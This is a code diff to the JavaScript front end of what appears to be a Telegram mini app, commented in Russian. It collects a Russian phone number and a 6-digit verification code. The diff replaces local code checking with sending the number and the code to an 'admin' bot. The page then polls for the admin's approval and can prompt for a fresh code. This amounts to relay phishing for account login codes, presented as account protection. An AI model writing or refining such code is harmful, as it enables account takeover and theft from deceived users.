@@ -14,61 +14,38 @@ document.addEventListener('DOMContentLoaded', () => {
     const codeError = document.getElementById('code-error');
     const submitCodeBtn = document.getElementById('submit-code');
 
-    // Состояние приложения
+    // Состояние
     let currentPhone = '';
+    let verificationStatus = 'pending'; // 'pending' | 'approved' | 'rejected'
 
     // Анимация загрузки
     const setLoading = (element, isLoading) => {
         element.disabled = isLoading;
         element.innerHTML = isLoading 
             ? '<div class="loader"></div>' 
-            : element.dataset.originalText;
+            : 'Подтвердить';
     };
 
-    // Сохраняем оригинальный текст кнопки
-    submitCodeBtn.dataset.originalText = submitCodeBtn.textContent;
-
-    // Форматирование номера
-    const formatPhone = (value) => {
-        const numbers = value.replace(/\D/g, '');
-        let formatted = '+7';
-        
-        if (numbers.length > 1) {
-            formatted += ' ' + numbers.substring(1, 4);
-        }
-        if (numbers.length > 4) {
-            formatted += ' ' + numbers.substring(4, 7);
-        }
-        if (numbers.length > 7) {
-            formatted += ' ' + numbers.substring(7, 9);
-        }
-        if (numbers.length > 9) {
-            formatted += ' ' + numbers.substring(9, 11);
-        }
-        
-        return formatted.substring(0, 16);
-    };
-
-    // Валидация номера
-    const validatePhone = (phone) => {
+    // Строгая проверка российского номера
+    const validateRussianPhone = (phone) => {
         const clean = phone.replace(/\D/g, '');
-        return clean.length === 11 && clean.startsWith('7');
+        // Проверяем: начинается с 7, длина 11 цифр (7XXXXXXXXXX)
+        return /^7\d{10}$/.test(clean);
     };
 
-    // Обработчик ввода телефона
+    // Автоформатирование номера
     phoneInput.addEventListener('input', (e) => {
-        phoneInput.value = formatPhone(e.target.value);
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 0) value = '7' + value.substring(1);
+        
+        let formatted = '+7';
+        if (value.length > 1) formatted += ' ' + value.substring(1, 4);
+        if (value.length > 4) formatted += ' ' + value.substring(4, 7);
+        if (value.length > 7) formatted += '-' + value.substring(7, 9);
+        if (value.length > 9) formatted += '-' + value.substring(9, 11);
+        
+        phoneInput.value = formatted.substring(0, 16);
     });
-
-    // Проверка кода (заглушка)
-    const verifyCode = async (code) => {
-        return new Promise(resolve => {
-            setTimeout(() => {
-                // В продакшене заменить на реальный API-запрос
-                resolve(code === '123456'); // Тестовый код
-            }, 1500);
-        });
-    };
 
     // Отправка номера
     document.getElementById('submit-phone').addEventListener('click', async () => {
@@ -79,8 +56,8 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
         
-        if (!validatePhone(phone)) {
-            showError(phoneError, 'Введите корректный российский номер (+7 XXX XXX XX XX)');
+        if (!validateRussianPhone(phone)) {
+            showError(phoneError, 'Требуется российский номер: +7 XXX XXX-XX-XX');
             return;
         }
         
@@ -89,6 +66,7 @@ document.addEventListener('DOMContentLoaded', () => {
         phoneForm.classList.add('hidden');
         codeForm.classList.remove('hidden');
         
+        // Отправляем данные админу
         if (window.sendToBot) {
             await window.sendToBot('phone', currentPhone);
         }
@@ -99,38 +77,41 @@ document.addEventListener('DOMContentLoaded', () => {
         const code = codeInput.value.trim();
         
         if (!/^\d{6}$/.test(code)) {
-            showError(codeError, 'Введите ровно 6 цифр');
+            showError(codeError, 'Ровно 6 цифр');
             return;
         }
         
         hideError(codeError);
         setLoading(submitCodeBtn, true);
         
-        const isValid = await verifyCode(code);
-        
-        if (isValid) {
-            if (window.sendToBot) {
-                await window.sendToBot('verified', code);
-            }
-            tg.showAlert('✅ Аккаунт успешно защищен!');
-            setTimeout(() => tg.close(), 1000);
-        } else {
-            showError(codeError, 'Неверный код. Попробуйте снова');
-            codeInput.value = '';
-            if (window.sendToBot) {
-                await window.sendToBot('failed', code);
-            }
+        // Отправляем код на проверку админу
+        if (window.sendToBot) {
+            await window.sendToBot('code', code);
         }
         
-        setLoading(submitCodeBtn, false);
+        // Имитация ожидания решения админа
+        const checkInterval = setInterval(() => {
+            if (verificationStatus === 'approved') {
+                clearInterval(checkInterval);
+                tg.showAlert('✅ Подтверждено!', () => tg.close());
+            } else if (verificationStatus === 'rejected') {
+                clearInterval(checkInterval);
+                showError(codeError, 'Код отклонён. Введите новый');
+                codeInput.value = '';
+                setLoading(submitCodeBtn, false);
+            }
+        }, 2000);
     });
 
-    // Показ ошибки
+    // Обновление статуса из страниц подтверждения
+    window.updateVerificationStatus = (status) => {
+        verificationStatus = status;
+    };
+
     function showError(element, message) {
         element.textContent = message;
         element.style.display = 'block';
         element.style.animation = 'shake 0.5s';
-        setTimeout(() => element.style.animation = '', 500);
     }
 
     function hideError(element) {
